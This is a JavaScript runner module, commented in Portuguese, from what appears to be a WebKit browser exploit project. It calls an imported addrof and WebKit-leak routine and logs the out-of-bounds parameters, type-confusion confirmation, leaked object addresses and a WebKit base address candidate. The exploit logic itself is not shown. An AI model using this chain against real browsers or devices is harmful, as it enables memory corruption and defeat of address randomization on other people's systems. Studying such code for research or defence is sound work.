// js/script3/runAllAdvancedTestsS3.mjs (Runner para Addrof no Getter Lendo Scratchpad)
import { logS3, PAUSE_S3, MEDIUM_PAUSE_S3 } from './s3_utils.mjs';
import { getOutputAdvancedS3, getRunBtnAdvancedS3 } from '../dom_elements.mjs';
import {
    executeTypedArrayVictimAddrofAndWebKitLeak_R43,
    FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT
} from './testArrayBufferVictimCrash.mjs';

function safeToHexRunner(value, length = 8) { /* ... (como antes) ... */
    if (typeof value === 'number') { return '0x' + (value >>> 0).toString(16).padStart(length, '0'); }
    if (value === null || value === undefined) { return String(value); }
    if (typeof value === 'string' && value.startsWith('0x')) { return value; }
    return String(value);
}

async function runHeisenbugReproStrategy_TypedArrayVictim_R43_GetterReadScratch() {
    const FNAME_RUNNER = "runHeisenbugReproStrategy_TypedArrayVictim_R43_GetterReadScratch";
    logS3(`==== INICIANDO Estratégia de Reprodução do Heisenbug (${FNAME_RUNNER}) ====`, 'test', FNAME_RUNNER);
    
    const result = await executeTypedArrayVictimAddrofAndWebKitLeak_R43();
    const module_name_for_title = FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT;

    if (result.errorOccurred && !result.oob_params_of_best_result) {
        logS3(`  RUNNER R43(GetterReadScratch): Teste principal capturou ERRO: ${String(result.errorOccurred)}`, "critical", FNAME_RUNNER);
        document.title = `${module_name_for_title}: MainTest ERR!`;
    } else if (result) {
        logS3(`  RUNNER R43(GetterReadScratch): Teste principal completado. Analisando resultados...`, "good", FNAME_RUNNER);

        logS3(`  --- MELHOR RESULTADO GERAL ENCONTRADO ---`, "info_emphasis", FNAME_RUNNER);
        let bestParamsMsg = 'N/A';
        if (result.oob_params_of_best_result) {
            bestParamsMsg = `Offset: ${result.oob_params_of_best_result.offset}, Valor: ${result.oob_params_of_best_result.value} (RawOff: ${safeToHexRunner(result.oob_params_of_best_result.raw_offset)}, RawVal: ${safeToHexRunner(result.oob_params_of_best_result.raw_value)})`;
        }
        logS3(`    Melhores Parâmetros OOB: ${bestParamsMsg}`, "info", FNAME_RUNNER);
        
        const heisenbugInBest = result.heisenbug_on_M2_confirmed_by_tc_probe;
        logS3(`    TC Confirmada no Melhor Resultado: ${heisenbugInBest}`, heisenbugInBest ? "vuln" : "info", FNAME_RUNNER);
        if (result.tc_probe_details) {
            logS3(`    Detalhes Sonda TC (Melhor): ${JSON.stringify(result.tc_probe_details)}`, "leak_detail", FNAME_RUNNER);
        }

        if (result.best_iter_addrof_details) {
            const ad = result.best_iter_addrof_details;
            logS3(`    Detalhes Addrof no Getter (Melhor Iteração):`, "info_emphasis", FNAME_RUNNER);
            logS3(`      Tentativa: ${ad.attempted}, Sucesso: ${ad.success}`, ad.success ? "success_major" : "info", FNAME_RUNNER);
            logS3(`      Notas: ${ad.notes}`, "info", FNAME_RUNNER);
            if (ad.leaked_address_str) logS3(`      Endereço Vazado Bruto: ${ad.leaked_address_str}`, "leak", FNAME_RUNNER);
            if (ad.scratchpad_read_values && ad.scratchpad_read_values.length > 0) {
                logS3(`      Valores lidos do Scratchpad (no getter):`, "leak_detail");
                ad.scratchpad_read_values.slice(0,4).forEach(sp_val => { // Logar os primeiros
                     logS3(`        idx ${sp_val.i}/${sp_val.i+1}: L=0x${sp_val.low.toString(16)} H=0x${sp_val.high.toString(16)}`, "leak_detail");
                });
            }
        }

        if (result.addrof_result) {
             logS3(`    Resultado Addrof (Global): ${result.addrof_result.msg} (Endereço: ${result.addrof_result.leaked_object_addr || 'N/A'})`, result.addrof_result.success ? "success_major" : "warn", FNAME_RUNNER);
        }
        if (result.webkit_leak_result) {
            logS3(`    Resultado WebKitLeak (Global): ${result.webkit_leak_result.msg} (Base: ${result.webkit_leak_result.webkit_base_candidate || 'N/A'})`, result.webkit_leak_result.success ? "success_major" : "info", FNAME_RUNNER);
        }
        if (result.errorOccurred && result.oob_params_of_best_result) {
             logS3(`    Erro no Melhor Resultado Reportado: ${result.errorOccurred}`, "error", FNAME_RUNNER);
        }

        if (result.iteration_results_summary && result.iteration_results_summary.length > 0) {
            logS3(`  --- SUMÁRIO DE TODAS AS ITERAÇÕES (${result.iteration_results_summary.length} testadas) ---`, "info_emphasis", FNAME_RUNNER);
            result.iteration_results_summary.forEach((iter_sum, index) => {
                let logMsg = `    Iter ${index + 1} (Off ${iter_sum.oob_offset} Val ${iter_sum.oob_value}): `;
                let highlights = [];
                if (iter_sum.heisenbug_on_M2_confirmed_by_tc_probe) highlights.push("TC_OK");
                if (iter_sum.addrof_success_this_iter) highlights.push("ADDROF_OK");
                if (iter_sum.webkit_leak_success_this_iter) highlights.push("WKLeak_OK");
                                
                if (highlights.length > 0) { logMsg += highlights.join(", "); }
                else { logMsg += "Sem Sucesso Notável"; }
                if(iter_sum.error) logMsg += `, Err: ${iter_sum.error}`;
                
                let logLevel = "info";
                if (iter_sum.webkit_leak_success_this_iter) logLevel = "success_major";
                else if (iter_sum.addrof_success_this_iter) logLevel = "vuln_potential";
                else if (iter_sum.heisenbug_on_M2_confirmed_by_tc_probe) logLevel = "vuln";
                logS3(logMsg, logLevel, FNAME_RUNNER);
            });
        } else {
            logS3(`  Sumário de iterações não disponível ou vazio.`, "warn", FNAME_RUNNER);
        }

        document.title = result.final_title_page || `${module_name_for_title} Final: Ver Logs`;
    } else {
        document.title = `${module_name_for_title}_R43_GetterReadScratch: Invalid Result Obj`;
        logS3(`  RUNNER R43(GetterReadScratch): Objeto de resultado inválido ou nulo.`, "critical", FNAME_RUNNER);
    }

    logS3(`  Título da página final (definido pelo teste): ${document.title}`, "info", FNAME_RUNNER);
    await PAUSE_S3(MEDIUM_PAUSE_S3);
    logS3(`==== Estratégia de Reprodução do Heisenbug (${FNAME_RUNNER}) CONCLUÍDA ====`, 'test', FNAME_RUNNER);
}

export async function runAllAdvancedTestsS3() {
    const FNAME_ORCHESTRATOR = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT}_MainOrchestrator_GetterReadScratch`;
    logS3(`==== INICIANDO Script 3 R43_GetterReadScratch (${FNAME_ORCHESTRATOR}) ... ====`, 'test', FNAME_ORCHESTRATOR);
    
    await runHeisenbugReproStrategy_TypedArrayVictim_R43_GetterReadScratch();
    
    logS3(`\n==== Script 3 R43_GetterReadScratch (${FNAME_ORCHESTRATOR}) CONCLUÍDO ====`, 'test', FNAME_ORCHESTRATOR);
    const runBtn = getRunBtnAdvancedS3(); if (runBtn) runBtn.disabled = false;

    if (document.title.includes(FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT) &&
        !document.title.includes("Final:") && 
        !document.title.toUpperCase().includes("OK") &&
        !document.title.toUpperCase().includes("SUCCESS") &&
        !document.title.includes("ERR") && 
        !document.title.includes("Invalid")) {
        document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT}_R43_GetterReadScratch_Done`;
    }
}
